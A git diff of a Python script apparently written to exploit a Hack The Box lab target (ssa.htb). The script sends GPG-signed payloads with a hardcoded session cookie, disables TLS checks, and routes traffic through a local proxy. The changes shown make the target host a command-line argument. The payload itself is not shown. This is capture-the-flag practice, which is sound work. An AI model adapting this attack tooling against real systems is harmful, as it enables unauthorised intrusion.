@@ -9,6 +9,8 @@ import re
 from datetime import datetime
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
+host = sys.argv[1]
+
 proxy = {"https":"http://127.0.0.1:8080"}
 
 gpg = gnupg.GPG()
@@ -18,7 +20,7 @@ port = 4455
 
 def get_pub_key():
 	key_url = "https://ssa.htb:443/pgp"
-	return '\n'.join(requests.get(key_url, verify=False).text.split("\n")[1:-1])
+	return '\n'.join(requests.get(key_url, verify=False, proxies=proxy).text.split("\n")[1:-1])
 
 
 def encrypt_message(message, public_key):
@@ -36,7 +38,7 @@ def send_contact_message(message):
 	pub_key = get_pub_key()
 	enc_message = encrypt_message(message, pub_key)
 
-	contact_url = "https://ssa.htb:443/contact"
+	contact_url = f"https://{host}:443/contact"
 	contact_data = {"encrypted_text": enc_message}
 	requests.post(contact_url, data=contact_data, proxies=proxy, verify=False)
 
@@ -61,7 +63,7 @@ def create_gpg_keys_and_signature(payload, message):
 
 def send_request(signature, public_key):
 ## sending to url
-	url = "https://ssa.htb:443/process"
+	url = f"https://{host}:443/process"
 	cookies = {"session": "eyJfZnJlc2giOmZhbHNlfQ.ZOMRmg.t2IUclKZAiw9VqtSAy0xaZ4wAXM"}
 	headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0", "Accept": "*/*", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://ssa.htb", "Referer": "https://ssa.htb/guide", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
 	data = {"signed_text": str(signature), 
